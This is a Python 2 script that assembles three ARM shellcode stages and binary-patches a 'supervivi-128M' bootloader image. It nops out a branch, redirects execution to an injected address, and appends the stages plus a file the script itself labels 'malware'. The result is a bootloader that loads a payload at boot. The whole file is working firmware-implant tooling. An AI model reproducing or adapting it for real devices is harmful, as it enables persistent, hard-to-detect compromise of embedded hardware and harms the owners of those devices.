import commands
import os
from zio import *
from keystone import *  # pip install keystone-engine


def asm_compile(infile):
    assembler = 'arm-linux-as'
    objcopy = 'arm-linux-objcopy'

    header = '''.section .shellcode,"awx"
.global _start
.global __start
_start:
__start:
.syntax unified
.arch armv4
.arm
'''

    sc = open(infile, 'rb').read().replace('\x0d\x0a', '\x0a')

    addheader_file = infile + '_addheader'
    with open(addheader_file, 'wb') as f:
        f.write(header)
        f.write(sc)

    cmd = '%s -EL -o %s.o %s' % (assembler, infile, addheader_file)
    status, output = commands.getstatusoutput(cmd)
    # print status, output
    if status != 0:
        print output
        print 'assemble fail'
        return -1

    cmd = '%s -j .shellcode -Obinary %s.o %s.bin' % (objcopy, infile, infile)
    status, output = commands.getstatusoutput(cmd)
    # print status, output
    if status != 0:
        print 'objcopy fail'
        return -1
    os.remove(infile+'_addheader')
    os.remove(infile+'.o')
    return 0


def test_compile():
    with open('sc.s', 'wb') as f:
        f.write('mov r0, r0\n')

    status = asm_compile('./csh/files/sc.s')
    if status != 0:
        print 'compile fail'


'''
0xe10 BEQ loc_E54 -> nop
0xE48 LDR R3, =0x33F00000 ->  BL 0xe54
0xd04 MOV PC, R5 -> BL 0xed4
0xed4 0xffffffff -> LDR PC, [PC] 
0xed8 0xffffffff -> BX R3 
0xedc 0xffffffff -> 0x33f3befc # 0x33f00000+len(supervivi-128M)-0x1000
'''
def patch_vivi(vivifile):
    d = open(vivifile, 'rb').read()
    patch_codes = []
    patch_codes.append((0xe10, 'mov r0, r0'))
    patch_codes.append((0xe48, 'bl 0xe54'))
    patch_codes.append((0xd04, 'BL 0xed4'))
    patch_codes.append((0xed4, 'LDR PC, [PC, #-4]'))
    patch_codes.append((0xed8, 0x33f3befc))

    ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
    for addr, asm in patch_codes:
        if isinstance(asm, int):
            code = l32(asm)
            d = d[0:addr] + code + d[addr + 4:]
        else:
            #print asm
            encoding, count = ks.asm(asm, addr=addr)
            code = ''.join(chr(i) for i in encoding)
            d = d[0:addr] + code + d[addr + 4:]

    # encoding, count = ks.asm('mov pc, r5', addr=0x33f3befc)
    # code = ''.join(chr(i) for i in encoding)
    # d += code
    d += open('./csh/files/step1.s.bin', 'rb').read()
    d += open('./csh/files/step2.s.bin', 'rb').read()
    d += open('./csh/files/step3.s.bin', 'rb').read()
    d += open('./csh/files/hello', 'rb').read()

    patch_file = vivifile + '_patched'
    open(patch_file, 'wb').write(d)
    print 'patch success: %s' %patch_file

    os.remove('./csh/files/step1.s.bin')
    os.remove('./csh/files/step2.s.bin')
    os.remove('./csh/files/step3.s.bin')


if __name__ == '__main__':
    # test_compile()
    status = asm_compile('./csh/files/step1.s')
    if status != 0:
        print 'compile step1 fail'

    print 'compile step1 success'

    status = asm_compile('./csh/files/step2.s')
    if status != 0:
        print 'compile step2 fail'

    print 'compile step2 success'

    status = asm_compile('./csh/files/step3.s')
    if status != 0:
        print 'compile step3 fail'

    print 'compile step3 success'

    size1 = os.path.getsize('./csh/files/step1.s.bin')
    size2 = os.path.getsize('./csh/files/step2.s.bin')
    size3 = os.path.getsize('./csh/files/step3.s.bin')
    malware_size = os.path.getsize('./csh/files/hello')

    print 'size2=%s, malware=%s, size3+malware=%s, size2+size3+malware=%s' %(hex(size2), hex(malware_size), hex(size3 + malware_size), hex(size2 + size3 + malware_size))
    patch_vivi('./csh/files/supervivi-128M')

